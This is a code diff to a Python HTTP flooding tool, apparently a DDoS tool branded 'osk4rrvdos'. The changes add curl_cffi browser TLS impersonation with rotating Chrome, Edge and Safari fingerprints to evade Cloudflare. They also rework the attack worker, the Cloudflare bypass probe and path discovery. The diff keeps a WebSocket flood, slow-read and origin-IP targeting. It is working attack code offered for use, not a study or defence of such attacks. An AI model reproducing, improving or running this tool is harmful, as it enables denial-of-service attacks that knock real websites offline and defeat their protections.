@@ -31,6 +31,12 @@ try:
 except ImportError:
     SOCKS_AVAILABLE = False
 
+try:
+    from curl_cffi.requests import AsyncSession as CurlAsyncSession
+    CURL_CFFI_AVAILABLE = True
+except ImportError:
+    CURL_CFFI_AVAILABLE = False
+
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -364,6 +370,7 @@ connection_errors = 0
 
 # 1000x upgrade config globals
 force_close_conns = False
+use_curl_cffi = CURL_CFFI_AVAILABLE
 use_http2 = False
 enable_websocket = False
 dns_over_https = False
@@ -457,9 +464,11 @@ def pick_path():
     if bypass_active and known_good_paths and random.random() < 0.7:
         return random.choice(known_good_paths)
     r = random.random()
-    if r < 0.40:
+    if r < 0.50:
+        return "/"
+    elif r < 0.70:
         return random.choice(PRIMARY_PATHS)
-    elif r < 0.75:
+    elif r < 0.85:
         return random.choice(SECONDARY_PATHS)
     return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))
 
@@ -546,7 +555,7 @@ def show_banner():
 
 def print_live():
     global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
-    global bypass_active, latency_times, total_bytes_sent, total_bytes_recv
+    global bypass_active, latency_times, total_bytes_sent, total_bytes_recv, use_curl_cffi
     if stopped:
         return
     os.system("cls" if os.name == "nt" else "clear")
@@ -581,6 +590,7 @@ def print_live():
     safe_print(f" Slow read         : {sr_str}")
     safe_print(f" Adaptive scaling  : {as_str}")
     safe_print(f" HTTP/2            : {h2_str}")
+    safe_print(f" TLS impersonation : {'curl_cffi' if use_curl_cffi else 'aiohttp (native)'}")
     safe_print(f" WebSocket flood   : {ws_str}")
     safe_print(f" Sessions          : {session_count}")
     safe_print(f" Request rate      : {req_rate:.1f} req/s")
@@ -968,40 +978,63 @@ def pick_cf_path():
 
 async def cf_bypass_probe(target, host):
     global cf_bypass_count
-    loop = asyncio.get_event_loop()
     results = {"cf_detected": False, "challenge": False, "bypassed": False, "origin_ip": None}
-    ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
-    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=5, force_close=True)
-    async with aiohttp.ClientSession(connector=connector) as s:
-        hdrs = build_headers(host)
-        try:
-            async with s.get(target, headers=hdrs,
-                             timeout=aiohttp.ClientTimeout(total=8),
-                             allow_redirects=False) as resp:
-                raw_headers = dict(resp.headers)
-                hs = str(raw_headers).lower()
+    hdrs = build_headers(host)
+    if use_curl_cffi:
+        async with CurlAsyncSession(impersonate="chrome") as s:
+            try:
+                r = await s.get(target, headers=hdrs, timeout=8, allow_redirects=False)
+                hs = str(dict(r.headers)).lower()
                 if "cf-ray" in hs or "cloudflare" in hs or "__cfduid" in hs:
                     results["cf_detected"] = True
-                if resp.status == 403:
-                    body = await resp.text()
+                if r.status_code == 403:
+                    body = r.text
                     if "challenge" in body.lower() or "cf_chl" in body.lower():
                         results["challenge"] = True
-                if resp.status < 400:
+                if r.status_code < 400:
                     results["bypassed"] = True
-        except Exception:
-            pass
-
-        for path in ["/cdn-cgi/trace", "/robots.txt", "/.well-known/security.txt"]:
-            try:
-                async with s.get(f"{target}{path}", headers=hdrs,
-                                 timeout=aiohttp.ClientTimeout(total=5),
-                                 allow_redirects=False) as resp:
-                    if resp.status < 400:
+            except Exception:
+                pass
+            for path in ["/cdn-cgi/trace", "/robots.txt", "/.well-known/security.txt"]:
+                try:
+                    r = await s.get(f"{target}{path}", headers=hdrs, timeout=5, allow_redirects=False)
+                    if r.status_code < 400:
                         results["bypassed"] = True
                         with lock:
                             cf_bypass_count += 1
+                except Exception:
+                    pass
+    else:
+        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
+        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=5, force_close=True)
+        async with aiohttp.ClientSession(connector=connector) as s:
+            try:
+                async with s.get(target, headers=hdrs,
+                                 timeout=aiohttp.ClientTimeout(total=8),
+                                 allow_redirects=False) as resp:
+                    raw_headers = dict(resp.headers)
+                    hs = str(raw_headers).lower()
+                    if "cf-ray" in hs or "cloudflare" in hs or "__cfduid" in hs:
+                        results["cf_detected"] = True
+                    if resp.status == 403:
+                        body = await resp.text()
+                        if "challenge" in body.lower() or "cf_chl" in body.lower():
+                            results["challenge"] = True
+                    if resp.status < 400:
+                        results["bypassed"] = True
             except Exception:
                 pass
+            for path in ["/cdn-cgi/trace", "/robots.txt", "/.well-known/security.txt"]:
+                try:
+                    async with s.get(f"{target}{path}", headers=hdrs,
+                                     timeout=aiohttp.ClientTimeout(total=5),
+                                     allow_redirects=False) as resp:
+                        if resp.status < 400:
+                            results["bypassed"] = True
+                            with lock:
+                                cf_bypass_count += 1
+                except Exception:
+                    pass
     return results
 
 def detect_technologies(headers):
@@ -1023,7 +1056,16 @@ def detect_technologies(headers):
 def discover_known_paths(target, host):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    async def check(session, p):
+    async def check_curl(session, p):
+        try:
+            hdrs = build_headers(host)
+            r = await session.get(f"{target}{p}", headers=hdrs, timeout=5, allow_redirects=True)
+            if r.status_code < 400:
+                return p
+        except Exception:
+            pass
+        return None
+    async def check_aiohttp(session, p):
         try:
             hdrs = build_headers(host)
             async with session.get(f"{target}{p}", headers=hdrs,
@@ -1036,12 +1078,18 @@ def discover_known_paths(target, host):
             pass
         return None
     async def run():
-        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
-        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=15, force_close=True)
-        async with aiohttp.ClientSession(connector=connector) as s:
-            tasks = [check(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            return [r for r in results if isinstance(r, str)]
+        if use_curl_cffi:
+            async with CurlAsyncSession(impersonate="chrome") as s:
+                tasks = [check_curl(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                return [r for r in results if isinstance(r, str)]
+        else:
+            ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
+            connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=15, force_close=True)
+            async with aiohttp.ClientSession(connector=connector) as s:
+                tasks = [check_aiohttp(s, p) for p in PRIMARY_PATHS + SECONDARY_PATHS]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                return [r for r in results if isinstance(r, str)]
     good = loop.run_until_complete(run())
     loop.close()
     return good
@@ -1176,7 +1224,7 @@ async def attack_worker(session, url_obj, host, tid):
     global total_proxy_used, total_direct_used, proxy_alive
     global total_post_sent, total_get_sent, total_head_sent, total_429, total_503, adaptive_cooldown
     global cf_bypass_count, cf_origin_target, connection_errors
-    global latency_times, total_bytes_sent, total_bytes_recv
+    global latency_times, total_bytes_sent, total_bytes_recv, use_curl_cffi
 
     scheme = url_obj.scheme
     netloc = url_obj.netloc
@@ -1201,8 +1249,8 @@ async def attack_worker(session, url_obj, host, tid):
         else:
             target = f"{scheme}://{netloc}{path}"
 
-        # WebSocket flood attack vector
-        if enable_websocket and random.random() < 0.25:
+        # WebSocket flood attack vector (aiohttp only — curl_cffi has no WS support)
+        if enable_websocket and not use_curl_cffi and random.random() < 0.25:
             try:
                 ws_path = random.choice(WEBSOCKET_PATHS)
                 if cf_kill and direct_origin and origin_ips:
@@ -1243,93 +1291,100 @@ async def attack_worker(session, url_obj, host, tid):
             post_data = gen_payload()
 
         try:
-            if method == "GET":
-                ctx = session.get(target, headers=headers,
-                                  timeout=aiohttp.ClientTimeout(total=3),
-                                  allow_redirects=True)
-            elif method == "POST":
-                ctx = session.post(target, headers=headers, data=post_data,
-                                   timeout=aiohttp.ClientTimeout(total=3),
-                                   allow_redirects=True)
-            elif method == "HEAD":
-                ctx = session.head(target, headers=headers,
-                                   timeout=aiohttp.ClientTimeout(total=3),
-                                   allow_redirects=True)
-            elif method == "OPTIONS":
-                ctx = session.options(target, headers=headers,
+            start_ts = time.time()
+
+            if use_curl_cffi:
+                req_kwargs = {"headers": headers, "timeout": 8, "allow_redirects": True}
+                if method in ("POST", "PUT", "PATCH") and post_data:
+                    req_kwargs["data"] = post_data
+                req_func = getattr(session, method.lower())
+                resp = await req_func(target, **req_kwargs)
+                code = resp.status_code
+                body = resp.content
+            else:
+                if method == "GET":
+                    ctx = session.get(target, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=3),
                                       allow_redirects=True)
-            elif method == "PUT":
-                ctx = session.put(target, headers=headers, data=post_data,
-                                  timeout=aiohttp.ClientTimeout(total=3),
-                                  allow_redirects=True)
-            elif method == "PATCH":
-                ctx = session.patch(target, headers=headers, data=post_data,
-                                    timeout=aiohttp.ClientTimeout(total=3),
-                                    allow_redirects=True)
-            elif method == "DELETE":
-                ctx = session.delete(target, headers=headers,
-                                     timeout=aiohttp.ClientTimeout(total=3),
-                                     allow_redirects=True)
-            else:
-                ctx = session.get(target, headers=headers,
-                                  timeout=aiohttp.ClientTimeout(total=3),
-                                  allow_redirects=True)
-
-            start_ts = time.time()
-            async with ctx as resp:
-                code = resp.status
-                body = b""
-
-                if slow_read and not boost_mode and resp.content_length and resp.content_length > 0:
-                    try:
-                        while True:
-                            chunk = await asyncio.wait_for(
-                                resp.content.read(64), timeout=10)
-                            if not chunk:
-                                break
-                            await asyncio.sleep(random.uniform(0.5, 2.0))
-                    except Exception:
-                        pass
+                elif method == "POST":
+                    ctx = session.post(target, headers=headers, data=post_data,
+                                       timeout=aiohttp.ClientTimeout(total=3),
+                                       allow_redirects=True)
+                elif method == "HEAD":
+                    ctx = session.head(target, headers=headers,
+                                       timeout=aiohttp.ClientTimeout(total=3),
+                                       allow_redirects=True)
+                elif method == "OPTIONS":
+                    ctx = session.options(target, headers=headers,
+                                          timeout=aiohttp.ClientTimeout(total=3),
+                                          allow_redirects=True)
+                elif method == "PUT":
+                    ctx = session.put(target, headers=headers, data=post_data,
+                                      timeout=aiohttp.ClientTimeout(total=3),
+                                      allow_redirects=True)
+                elif method == "PATCH":
+                    ctx = session.patch(target, headers=headers, data=post_data,
+                                        timeout=aiohttp.ClientTimeout(total=3),
+                                        allow_redirects=True)
+                elif method == "DELETE":
+                    ctx = session.delete(target, headers=headers,
+                                         timeout=aiohttp.ClientTimeout(total=3),
+                                         allow_redirects=True)
                 else:
-                    body = await resp.read()
+                    ctx = session.get(target, headers=headers,
+                                      timeout=aiohttp.ClientTimeout(total=3),
+                                      allow_redirects=True)
 
-                latency = time.time() - start_ts
-                with lock:
-                    latency_times.append(latency)
-                    total_bytes_recv += len(body)
-                    if post_data:
-                        total_bytes_sent += len(post_data.encode() if isinstance(post_data, str) else post_data)
-                    total_sent += 1
-                    last_http_code = code
-                    last_code_label = code_label(code)
-                    total_direct_used += 1
-                    if 200 <= code < 400:
-                        total_success += 1
-                        if cf_kill:
-                            cf_bypass_count += 1
+                async with ctx as resp:
+                    code = resp.status
+                    body = b""
+                    if slow_read and not boost_mode and resp.content_length and resp.content_length > 0:
+                        try:
+                            while True:
+                                chunk = await asyncio.wait_for(
+                                    resp.content.read(64), timeout=10)
+                                if not chunk:
+                                    break
+                                await asyncio.sleep(random.uniform(0.5, 2.0))
+                        except Exception:
+                            pass
                     else:
-                        total_failed += 1
-                        if total_failed <= 20:
-                            body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
-                            log_error(f"HTTP {code} | target={target} | body={body_snip}")
-                    if method == "GET":
-                        total_get_sent += 1
-                    elif method == "POST":
-                        total_post_sent += 1
-                    elif method == "HEAD":
-                        total_head_sent += 1
-                    if code == 429:
-                        total_429 += 1
-                    elif code == 503:
-                        total_503 += 1
+                        body = await resp.read()
 
-                    if adaptive_scaling and code in (429, 503):
-                        adaptive_cooldown = True
+            latency = time.time() - start_ts
+            with lock:
+                latency_times.append(latency)
+                total_bytes_recv += len(body)
+                if post_data:
+                    total_bytes_sent += len(post_data.encode() if isinstance(post_data, str) else post_data)
+                total_sent += 1
+                last_http_code = code
+                last_code_label = code_label(code)
+                total_direct_used += 1
+                if 200 <= code < 400:
+                    total_success += 1
+                    if cf_kill:
+                        cf_bypass_count += 1
+                else:
+                    total_failed += 1
+                    if total_failed <= 20:
+                        body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
+                        log_error(f"HTTP {code} | target={target} | body={body_snip}")
+                if method == "GET":
+                    total_get_sent += 1
+                elif method == "POST":
+                    total_post_sent += 1
+                elif method == "HEAD":
+                    total_head_sent += 1
+                if code == 429:
+                    total_429 += 1
+                elif code == 503:
+                    total_503 += 1
 
-        except (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError,
-                aiohttp.ClientOSError, aiohttp.ClientPayloadError,
-                aiohttp.ClientError, asyncio.TimeoutError) as e:
+                if adaptive_scaling and code in (429, 503):
+                    adaptive_cooldown = True
+
+        except Exception as e:
             err_msg = f"{type(e).__name__}: {str(e)[:120]} | target={target}"
             log_error(err_msg)
             with lock:
@@ -1359,8 +1414,6 @@ async def attack_worker(session, url_obj, host, tid):
                     total_head_sent += 1
                 if total_failed <= 10:
                     last_code_label = f"ERR: {type(e).__name__[:20]}"
-            if proxy:
-                remove_bad_proxy(proxy)
 
         rate_times.append(time.time())
 
@@ -1400,29 +1453,40 @@ def _browser_ssl_context(force_h2=False):
 
 
 async def http_attack(url, host, conns):
-    global peak_rps, adaptive_cooldown
+    global peak_rps, adaptive_cooldown, use_curl_cffi
     parsed = urlparse(url)
     ssl_ctx = _browser_ssl_context(force_h2=H2_AVAILABLE) if parsed.scheme == "https" else False
 
     sessions = []
     all_tasks = []
 
-    for s_idx in range(session_count):
-        conn_kwargs = {
-            "ssl": ssl_ctx,
-            "limit": conns,
-            "limit_per_host": conns,
-            "force_close": force_close_conns,
-            "enable_cleanup_closed": True,
-            "ttl_dns_cache": 300,
-        }
-        if not force_close_conns:
-            conn_kwargs["keepalive_timeout"] = 30
-        connector = aiohttp.TCPConnector(**conn_kwargs)
-        sess = aiohttp.ClientSession(connector=connector)
-        sessions.append(sess)
-        for i in range(conns):
-            all_tasks.append(asyncio.create_task(attack_worker(sess, parsed, host, i)))
+    if use_curl_cffi:
+        impersonate_choices = ["chrome", "chrome110", "chrome116", "chrome120", "chrome124",
+                               "edge99", "edge101", "safari15_3", "safari15_5", "safari17_0"]
+        safe_print(f"< / > Using curl_cffi (browser TLS impersonation) — {len(impersonate_choices)} fingerprints")
+        for s_idx in range(session_count):
+            imp = random.choice(impersonate_choices)
+            sess = CurlAsyncSession(impersonate=imp)
+            sessions.append(sess)
+            for i in range(conns):
+                all_tasks.append(asyncio.create_task(attack_worker(sess, parsed, host, i)))
+    else:
+        for s_idx in range(session_count):
+            conn_kwargs = {
+                "ssl": ssl_ctx,
+                "limit": conns,
+                "limit_per_host": conns,
+                "force_close": force_close_conns,
+                "enable_cleanup_closed": True,
+                "ttl_dns_cache": 300,
+            }
+            if not force_close_conns:
+                conn_kwargs["keepalive_timeout"] = 30
+            connector = aiohttp.TCPConnector(**conn_kwargs)
+            sess = aiohttp.ClientSession(connector=connector)
+            sessions.append(sess)
+            for i in range(conns):
+                all_tasks.append(asyncio.create_task(attack_worker(sess, parsed, host, i)))
 
     try:
         while running:
@@ -1437,11 +1501,11 @@ async def http_attack(url, host, conns):
     await asyncio.gather(*all_tasks, return_exceptions=True)
     for sess in sessions:
         try:
-            await asyncio.wait_for(sess.close(), timeout=3)
-        except Exception:
-            pass
-        try:
-            await sess.connector.close()
+            if use_curl_cffi:
+                await sess.close()
+            else:
+                await asyncio.wait_for(sess.close(), timeout=3)
+                await sess.connector.close()
         except Exception:
             pass
 
@@ -1465,23 +1529,36 @@ def probe_target(target, host):
     asyncio.set_event_loop(loop)
     async def deep():
         r = {"status":0,"server":"?","size":0,"technologies":[],"headers":{}}
-        ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
-        connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=3)
-        async with aiohttp.ClientSession(connector=connector) as s:
-            hdrs = build_headers(host)
-            try:
-                async with s.get(target, headers=hdrs,
-                                 timeout=aiohttp.ClientTimeout(total=8),
-                                 allow_redirects=True) as resp:
-                    r["status"] = resp.status
-                    r["server"] = resp.headers.get("Server", resp.headers.get("server","?"))
+        hdrs = build_headers(host)
+        if use_curl_cffi:
+            async with CurlAsyncSession(impersonate="chrome") as s:
+                try:
+                    resp = await s.get(target, headers=hdrs, timeout=8, allow_redirects=True)
+                    r["status"] = resp.status_code
                     raw = dict(resp.headers)
+                    r["server"] = raw.get("Server", raw.get("server","?"))
                     r["headers"] = {k:v for k,v in list(raw.items())[:20]}
                     r["technologies"] = detect_technologies(raw)
-                    body = await resp.read()
-                    r["size"] = len(body)
-            except Exception as e:
-                r["server"] = str(e)[:60]
+                    r["size"] = len(resp.content)
+                except Exception as e:
+                    r["server"] = str(e)[:60]
+        else:
+            ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
+            connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=3)
+            async with aiohttp.ClientSession(connector=connector) as s:
+                try:
+                    async with s.get(target, headers=hdrs,
+                                     timeout=aiohttp.ClientTimeout(total=8),
+                                     allow_redirects=True) as resp:
+                        r["status"] = resp.status
+                        r["server"] = resp.headers.get("Server", resp.headers.get("server","?"))
+                        raw = dict(resp.headers)
+                        r["headers"] = {k:v for k,v in list(raw.items())[:20]}
+                        r["technologies"] = detect_technologies(raw)
+                        body = await resp.read()
+                        r["size"] = len(body)
+                except Exception as e:
+                    r["server"] = str(e)[:60]
         return r
     result = loop.run_until_complete(deep())
     loop.close()
@@ -1532,6 +1609,7 @@ def main():
     safe_print("</> Libraries loaded")
     safe_print("</> HTTP/2 support:", "YES" if H2_AVAILABLE else "Install h2")
     safe_print("</> SOCKS support:", "YES" if SOCKS_AVAILABLE else "Install aiohttp-socks")
+    safe_print("</> TLS impersonation:", "YES (curl_cffi)" if CURL_CFFI_AVAILABLE else "Install curl_cffi for CF bypass")
     safe_print("</> Official download only from github.com/osk4rrv/osk4rrvdos")
     safe_print("</> Created by @osk4rrv")
     safe_print("")
@@ -1676,6 +1754,8 @@ def main():
 
     if cli and cli.conns and cli.conns > 0:
         conns = cli.conns
+    elif use_curl_cffi:
+        conns = 5
     elif cf_kill and direct_origin and origin_ips:
         conns = 120 // session_count
     elif boost_mode:
@@ -1691,25 +1771,30 @@ def main():
     safe_print(f"\n[*] Launching ({total_conns} connections across {session_count} sessions) ...\n")
 
     safe_print("< / > Pre-flight test...")
+    p_target = f"{scheme}://{parsed.netloc}/"
     try:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         async def preflight():
-            ssl_ctx = _browser_ssl_context() if scheme == "https" else False
-            connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
-            async with aiohttp.ClientSession(connector=connector) as s:
-                p_headers = build_headers(host, None, "GET", port=port)
-                p_target = f"{scheme}://{parsed.netloc}/"
-                async with s.get(p_target, headers=p_headers,
-                                 timeout=aiohttp.ClientTimeout(total=10),
-                                 allow_redirects=True) as resp:
-                    await resp.read()
-                    return resp.status
+            p_headers = build_headers(host, None, "GET", port=port)
+            if use_curl_cffi:
+                async with CurlAsyncSession(impersonate="chrome") as s:
+                    r = await s.get(p_target, headers=p_headers, timeout=10, allow_redirects=True)
+                    return r.status_code
+            else:
+                ssl_ctx = _browser_ssl_context() if scheme == "https" else False
+                connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
+                async with aiohttp.ClientSession(connector=connector) as s:
+                    async with s.get(p_target, headers=p_headers,
+                                     timeout=aiohttp.ClientTimeout(total=10),
+                                     allow_redirects=True) as resp:
+                        await resp.read()
+                        return resp.status
         p_code = loop.run_until_complete(preflight())
         loop.close()
         safe_print(f"    Pre-flight OK — status {p_code}")
     except Exception as e:
-        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target if 'p_target' in locals() else 'N/A'}"
+        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target}"
         log_error(err_msg)
         safe_print(f"    Pre-flight FAIL — {type(e).__name__}: {str(e)[:80]}")
         safe_print("    Continuing anyway...")
